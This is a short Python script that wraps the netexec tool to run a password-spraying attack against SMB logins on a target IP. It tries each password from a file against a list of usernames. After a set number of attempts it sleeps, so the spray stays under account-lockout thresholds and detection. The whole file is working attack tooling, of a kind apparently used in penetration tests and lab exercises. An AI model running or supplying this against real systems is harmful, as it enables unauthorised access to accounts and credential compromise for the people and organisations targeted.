#!/usr/bin/env python3

# USAGE : ./netexec_sleep.py <ip> <user_file> <password_file> <sleep_seconds> <interval>
#
# For example, to spray 4 passwords from the password file against all users from the user file
# every 10mn :
# $ python3 netexec_sleep.py 192.168.233.70 usernames.txt passwords.txt 600 4 > ici

LOGFILE = "netexec_sleep.txt"

import os
import sys
import time
import subprocess

if not len(sys.argv) >= 6:
	sys.exit("USAGE: ./netexec_sleep.py <ip> <user_file> <password_file> <sleep_seconds> <interval>")

ip, user_file, password_file, sleep, interval = sys.argv[1:]

print("IP:\t\t %s\nUser File:\t %s\nPassword File:\t %s\nSleep:\t\t %s\nInterval:\t %s\n" % (ip, user_file, password_file, sleep, interval))

if os.path.exists(LOGFILE):
	os.remove(LOGFILE)

with open(password_file, "r") as f:
	buffer = f.read()

passwords = buffer.split("\n")

interval_count = 0

for password in passwords:
	subprocess.run(['netexec', 'smb', ip, '-u', user_file, '-p', password, '--continue-on-success'])
	interval_count += 1
	if interval_count >= int(interval):
		interval_count = 0
		print("[+] Sleeping now for %s seconds after %s spray" % (sleep, interval))
		time.sleep(int(sleep))
